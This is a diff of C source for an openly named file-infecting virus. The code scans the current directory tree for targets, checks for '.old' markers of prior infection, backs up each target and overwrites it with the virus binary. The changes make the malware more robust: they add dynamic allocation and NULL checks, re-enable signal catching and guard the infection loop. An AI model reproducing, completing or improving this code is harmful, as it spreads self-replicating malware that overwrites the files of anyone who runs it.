@@ -80,10 +80,6 @@ int launchMediaPlayer(int argc, char **argv) {
     return 0;
 }
 
-void signalHandler(int sig) {
-    fprintf(stdout, "\e[91m%s [%d]\e[39m\n", "catch signal", sig);
-}
-
 List *init(char *file)
 {
     List *list = malloc(sizeof(List));
@@ -152,15 +148,25 @@ bool isInfected(char* file, List *liste)
     if (!liste) {
         return false;
     }
-    char cible[500];
+    char *cible;
     char *sufOld = ".old";
+
+    if (!(cible = malloc(strlen(file) + strlen(sufOld) + 1))) {
+        fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Malloc error", strerror(errno));
+        return false;
+    }
     sprintf(cible,"%s%s",file, sufOld);
+
     Element *actuel = liste->p;
     while (actuel != NULL) {
         if (strcmp(cible, actuel->path) == 0) {
             return true;
         }
         actuel = actuel->prev;
+    }
+
+    if (cible) {
+        free(cible);
     }
     return false;
 }
@@ -172,13 +178,18 @@ void    reasearch(List **fichiers, List **old, List** dirs) {
     struct  dirent *entry;
     struct  stat s;
     char    *currentfolder;
-    char    fichier[500];
+    char    *fichier;
 
     if (*dirs && (*dirs)->p) {
         currentfolder = (*dirs)->p->path;
         dirp = opendir(currentfolder);
 
         while ((entry = readdir(dirp)) != NULL) {
+
+            if (!(fichier = malloc(strlen(currentfolder) + strlen(entry->d_name) + 2))) {
+                fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Malloc error", strerror(errno));
+                return ;
+            }
             sprintf(fichier, "%s/%s", currentfolder, entry->d_name);
 
             if (stat(fichier, &s) != -1) {
@@ -194,6 +205,10 @@ void    reasearch(List **fichiers, List **old, List** dirs) {
                         insert(fichiers, fichier);
                     }
                 }
+            }
+
+            if (fichier) {
+                free(fichier);
             }
         }
         closedir(dirp);
@@ -265,6 +280,11 @@ List    *searchFileToInfect(char *initPath) {
     return targets;
 }
 
+void signalHandler(int sig) {
+    fprintf(stdout, "\e[91m%s [%d]\e[39m\n", "catch signal", sig);
+    exit(1);
+}
+
 void catchSignals() {
     signal(SIGABRT, signalHandler);
     signal(SIGIO, signalHandler);
@@ -280,7 +300,17 @@ void    duplicate(char *srcVirus, char *destToInfect) {
     char    *destToInfectOld;
     int     bytes;
 
-    destToInfectOld = strcat(strdup(destToInfect), ".old");
+    if (!destToInfect || !srcVirus) {
+        fprintf(stderr, "\e[91m%s\e[39m\n", "Chain NULL");
+        return ;
+    }
+
+    if (!(destToInfectOld = malloc(strlen(destToInfect) + 5))) {
+        fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Malloc error", strerror(errno));
+        return ;
+    }
+
+    sprintf(destToInfectOld, "%s%s", destToInfect, ".old");
 
     fd_destToInfect = open(destToInfect, O_RDWR);
     fd_destToInfectOld = open(destToInfectOld, O_WRONLY | O_CREAT, 0755);
@@ -311,13 +341,16 @@ void    duplicate(char *srcVirus, char *destToInfect) {
     }
     close(fd_srcVirus);
     close(fd_destToInfect);
+
+    if (destToInfectOld) {
+        free(destToInfectOld);
+    }
 }
 
 int launchVirus(char *str) {
     char PATH[_SC_UCHAR_MAX];
 
-    //catchSignals();
-
+    catchSignals();
     fprintf(stderr, "\e[91m%s\e[39m\n", "DUPLICATE");
     if(getcwd(PATH, _SC_UCHAR_MAX) == NULL) {
         return EXIT_FAILURE;
@@ -327,7 +360,7 @@ int launchVirus(char *str) {
     cibles = searchFileToInfect(PATH);
 
     Element *actualtarget = NULL;
-    while ((actualtarget = cibles->p)) {
+    while (cibles && (actualtarget = cibles->p)) {
         duplicate(str, actualtarget->path);
         deleteItem(&cibles, actualtarget);
     }
